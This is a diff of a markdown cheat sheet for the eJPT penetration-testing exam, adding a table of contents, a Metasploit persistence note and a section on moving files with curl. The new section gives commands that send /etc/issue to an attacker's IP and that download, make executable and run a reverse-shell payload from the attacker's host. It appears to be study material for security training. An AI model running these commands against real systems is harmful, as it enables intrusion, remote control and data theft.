@@ -1,5 +1,127 @@
 # EJPT Cheat Sheet
 
+- [EJPT Cheat Sheet](#ejpt-cheat-sheet)
+  - [1 Introduction](#1-introduction)
+    - [1.1 Terms](#11-terms)
+    - [1.2 Crytography](#12-crytography)
+    - [1.3 VPN](#13-vpn)
+    - [1.4 Binary Arithmethic Codes](#14-binary-arithmethic-codes)
+      - [1.4.1 Binary Conversion](#141-binary-conversion)
+      - [1.4.2 Logical Operators](#142-logical-operators)
+    - [1.5 Hexadecimal](#15-hexadecimal)
+  - [2 Networking](#2-networking)
+    - [2.1 Protocols](#21-protocols)
+      - [2.1.1 Packets](#211-packets)
+      - [2.1.2 Protocol Layers](#212-protocol-layers)
+    - [2.2 IP](#22-ip)
+      - [2.2.1 IP/Mask](#221-ipmask)
+      - [2.2.3 IPv6](#223-ipv6)
+    - [2.3 Routing](#23-routing)
+    - [2.4 Link Layer Devices and Protocols](#24-link-layer-devices-and-protocols)
+      - [2.4.1 Switches](#241-switches)
+      - [2.4.2 Forwarding tables](#242-forwarding-tables)
+      - [2.4.3 Forwarding](#243-forwarding)
+      - [2.4.4 Address Resolution Protocol(ARP)](#244-address-resolution-protocolarp)
+      - [2.4.5 Hubs](#245-hubs)
+    - [2.5 TPC/UDP](#25-tpcudp)
+      - [2.5.1 Ports](#251-ports)
+      - [2.5.2 TCP and UDP Headers](#252-tcp-and-udp-headers)
+      - [2.5.3 TCP Three Way Handshake](#253-tcp-three-way-handshake)
+    - [2.6 Firewalls and Network Defence](#26-firewalls-and-network-defence)
+      - [2.6.1 Firewalls](#261-firewalls)
+    - [2.7 DNS](#27-dns)
+    - [2.8 Wireshark](#28-wireshark)
+      - [NIC Promiscuous Mode](#nic-promiscuous-mode)
+  - [3 Web Applications](#3-web-applications)
+    - [3.1 HTTP](#31-http)
+    - [3.2 HTTPS](#32-https)
+    - [3.3 HTTP Cookies](#33-http-cookies)
+      - [3.3.1 Cookie Domain](#331-cookie-domain)
+      - [3.3.2 Cookie Expiration](#332-cookie-expiration)
+      - [3.3.3 Cookie Http-Only Attribute](#333-cookie-http-only-attribute)
+      - [3.3.4 Cookie Secure Attribute](#334-cookie-secure-attribute)
+      - [3.3.5 Cookie Protocol](#335-cookie-protocol)
+    - [3.4 Sessions](#34-sessions)
+      - [3.5 Same Origin Policy](#35-same-origin-policy)
+  - [4 Scripting](#4-scripting)
+    - [4.1 Important Windows Commands](#41-important-windows-commands)
+  - [5 Information Gathering](#5-information-gathering)
+    - [5.1 Open-Source Intelligence](#51-open-source-intelligence)
+      - [5.1.1 Social Networks](#511-social-networks)
+      - [5.1.2 Public Sites Information Gathering](#512-public-sites-information-gathering)
+      - [5.1.3 Browsing Client´s Sites](#513-browsing-client%c2%b4s-sites)
+      - [5.1.4 Email Patterns](#514-email-patterns)
+    - [5.2 Subdomain Enumeration](#52-subdomain-enumeration)
+  - [6 Footprinting and Scanning](#6-footprinting-and-scanning)
+    - [6.1 Mapping Networks](#61-mapping-networks)
+    - [6.3 Nmap Ping Scan](#63-nmap-ping-scan)
+    - [6.4 nmap OS Fingerprinting](#64-nmap-os-fingerprinting)
+    - [6.5 nmap Port Scan](#65-nmap-port-scan)
+    - [6.6 Spotting Firewalls](#66-spotting-firewalls)
+    - [6.7 Masscann](#67-masscann)
+  - [7 Vulnerability Assessment](#7-vulnerability-assessment)
+    - [7.1 Vulnerability Scanner](#71-vulnerability-scanner)
+    - [7.2 Nessus](#72-nessus)
+  - [8 Web Application Attacks](#8-web-application-attacks)
+    - [8.1 Fingerprinting Web Servers](#81-fingerprinting-web-servers)
+      - [8.1.2 Fingerprinting with Netcat](#812-fingerprinting-with-netcat)
+      - [8.1.3 Fingerpriting with OpenSSL](#813-fingerpriting-with-openssl)
+      - [8.1.4 Fingerprinting with Httprint](#814-fingerprinting-with-httprint)
+    - [8.2 HTTP Verbs](#82-http-verbs)
+      - [8.2.1 Recap of HTTP verbs](#821-recap-of-http-verbs)
+      - [8.2.2 REST APIs](#822-rest-apis)
+    - [8.3 Expoliting Misconfigured HTTP Verbs](#83-expoliting-misconfigured-http-verbs)
+      - [8.3.1 Exploiting PUT](#831-exploiting-put)
+    - [8.4 Google Hacking](#84-google-hacking)
+    - [8.5 XSS](#85-xss)
+      - [8.5.1 Finding XSS](#851-finding-xss)
+      - [8.5.2 Reflected XSS](#852-reflected-xss)
+      - [8.5.3 Persistent XSS Attacks](#853-persistent-xss-attacks)
+    - [8.6 SQL Injections](#86-sql-injections)
+      - [8.6.1 SQL Statements](#861-sql-statements)
+      - [8.6.2 SQL Queries Inside Web App](#862-sql-queries-inside-web-app)
+      - [8.6.3 Vulnerable Dynamic Queries](#863-vulnerable-dynamic-queries)
+      - [8.6.4 Finding SQL Injections](#864-finding-sql-injections)
+      - [8.6.5 Exploiting Boolean Based SQLi](#865-exploiting-boolean-based-sqli)
+      - [8.6.6 UNION Based SQL Injections](#866-union-based-sql-injections)
+      - [8.6.6 SQLMap](#866-sqlmap)
+  - [9 System Attacks](#9-system-attacks)
+    - [9.1 Password Attacks](#91-password-attacks)
+      - [9.1.2 John the Ripper](#912-john-the-ripper)
+      - [9.1.3 Hashcat](#913-hashcat)
+      - [9.1.4 Rainbow Tables](#914-rainbow-tables)
+  - [10 Network Attacks](#10-network-attacks)
+    - [10.1 Authentication Cracking](#101-authentication-cracking)
+      - [10.1.1 Hydra](#1011-hydra)
+    - [10.2 Windows Shares](#102-windows-shares)
+      - [10.2.1 NetBIOS](#1021-netbios)
+      - [10.2.2 Shares](#1022-shares)
+      - [10.2.3 UNC Path](#1023-unc-path)
+      - [10.2.4 Admin Shares](#1024-admin-shares)
+    - [10.3 Null Sessions](#103-null-sessions)
+      - [10.3.1 Enumerating Windows Shares on Windows](#1031-enumerating-windows-shares-on-windows)
+    - [10.3.2 Checking for Null Sessions on Windows](#1032-checking-for-null-sessions-on-windows)
+      - [10.3.3 Exploiting Null Sessions on Windows](#1033-exploiting-null-sessions-on-windows)
+      - [10.3.4 Enumerating Windows Shares on Linux](#1034-enumerating-windows-shares-on-linux)
+      - [10.3.5 Checking for Null Sessions on Linux](#1035-checking-for-null-sessions-on-linux)
+      - [10.3.6 Check Null Sessions with Nmap](#1036-check-null-sessions-with-nmap)
+      - [10.3.7 Exploiting Null Sessions on Linux](#1037-exploiting-null-sessions-on-linux)
+      - [10.3.8 Samrdump](#1038-samrdump)
+      - [10.3.9 Nmap smb Brute Force](#1039-nmap-smb-brute-force)
+    - [10.4 ARP Poisoning](#104-arp-poisoning)
+      - [10.4.1 Arpspoof](#1041-arpspoof)
+    - [10.5 Metasploit](#105-metasploit)
+    - [10.6 Meterpreter](#106-meterpreter)
+      - [10.6.1 Priviledge Escalation in Meterpreter](#1061-priviledge-escalation-in-meterpreter)
+      - [10.6.2 Password Dumping in Meterpreter](#1062-password-dumping-in-meterpreter)
+      - [10.6.3 Uploading and Downloading Files in Meterpreter](#1063-uploading-and-downloading-files-in-meterpreter)
+  - [11 RCE Tips and Tricks](#11-rce-tips-and-tricks)
+    - [11.1 Blind Injections](#111-blind-injections)
+    - [11.2 After Uploading a Simple Non-Interactive PHP Shell](#112-after-uploading-a-simple-non-interactive-php-shell)
+      - [11.2.1 Identify constraints](#1121-identify-constraints)
+      - [11.2.2 Trying to Spawn Bash on Connection](#1122-trying-to-spawn-bash-on-connection)
+      - [11.2.3 Transferring Files with Curl](#1123-transferring-files-with-curl)
+
 ## 1 Introduction
 
 ### 1.1 Terms
@@ -1222,7 +1344,7 @@
   - Gather information about shares
 - **nmap script=smb-enum-users (target IP)**
   - Gather information about users on the network
-- **nmap script smb-check-vulns.nse script-args=unsafe=1 (target IP)**
+- **nmap script vuln script-args=unsafe=1 (target IP)**
   - Is SMB server vulnerable to known smb vulnerabilities
 
 #### 10.3.7 Exploiting Null Sessions on Linux
@@ -1295,6 +1417,9 @@
   - RHOST = IP to target machine
   - LHOST = Localhost IP to the machine of the attacker
   - LPORT = Port on the attackers machine
+
+- **persistence modules**
+  - Install backdoors
 
 - **Example of use**
   - ARP scan
@@ -1404,7 +1529,7 @@
       - Could be the only way to get output from underlying commands being executed
   - Encode data from server
     - When requests are not displaying the commands in a usefull way
-      - e.g output is (UID=33)/www-data
+      - e.g output is /UID=33 /www-data
     - **Try base64**
 
       - ```bash
@@ -1412,3 +1537,24 @@
 
     - Decode it
       - echo (encoded string) | base64 -d
+
+#### 11.2.3 Transferring Files with Curl
+
+- Transfer files with PUT in curl
+  - **curl (attackers IP):(nc port)/file -T /etc/issue**
+
+- Transfer metasploit reverse shell payload
+  - **python -m SimpleHTTPServer (port)**
+    - Start it from the directory with the file to be transferred
+  - Generate reverse shell payload with metasploit
+  - GET with curl
+    - **curl (attackers IP):(nc port)/payload_file -o /tmp/r**
+    - **chmod +x /tmp/r**
+    - Confirm it exists by trying to upload it back
+      - **curl (attackers IP):(nc port) -T /tmp/r**
+    - Run it
+      - **/tmp/r**
+
+- Upgrading shell to terminal
+  - **bask -i**
+  - spawning TTY shell with python(search the webbs)
